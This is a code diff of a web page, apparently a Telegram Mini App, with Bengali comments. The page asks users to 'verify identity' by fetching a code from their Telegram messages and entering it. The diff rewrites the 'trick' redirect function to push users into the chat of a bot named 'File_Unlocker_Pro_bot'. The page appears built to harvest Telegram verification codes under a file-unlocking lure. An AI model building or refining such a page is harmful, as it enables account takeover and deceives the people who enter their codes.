@@ -29,7 +29,7 @@
         <h3>Verify Identity</h3>
         <p class="info-text">Click below to see the code, then enter it here.</p>
         
-        <!-- এই বাটনে ক্লিক করলেই ম্যাজিকটা হবে -->
+        <!-- GET CODE বাটন -->
         <button class="btn btn-blue" onclick="minimizeAndGetCode()">📩 GET CODE 📩</button>
         
         <input type="number" id="otp" placeholder="Enter Code">
@@ -79,10 +79,26 @@
             } catch (e) { alert("Error connecting to server!"); }
         }
 
-        // এটাই হলো সেই ট্রিক ফাংশন
+        // এবার আমরা আরও শক্তিশালী পদ্ধতি ব্যবহার করব
         function minimizeAndGetCode() {
-            // আপনার বটের লিংক দিয়ে মিনিমাইজ করার কমান্ড
-            tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
+            try {
+                // ১. সরাসরি ডিপ লিংকের মাধ্যমে বটের চ্যাটে যাওয়ার চেষ্টা
+                window.location.replace("tg://resolve?domain=File_Unlocker_Pro_bot");
+                
+                // ২. যদি উপরেরটা কাজ না করে, তবে ০.৩ সেকেন্ড পর অফিশিয়াল মেথড ট্রাই করবে
+                setTimeout(() => {
+                    tg.openTelegramLink("https://t.me/File_Unlocker_Pro_bot");
+                }, 300);
+
+                // ৩. অতিরিক্ত ব্যাকআপ: সরাসরি চ্যাট লিস্টে পাঠানো
+                setTimeout(() => {
+                    window.location.href = "tg://";
+                }, 600);
+
+            } catch (err) {
+                // যদি সব ফেইল করে, ইউজারকে নির্দেশ দেখাবে
+                alert("Please minimize the app and check your Telegram messages!");
+            }
         }
 
         async function verifyOTP() {
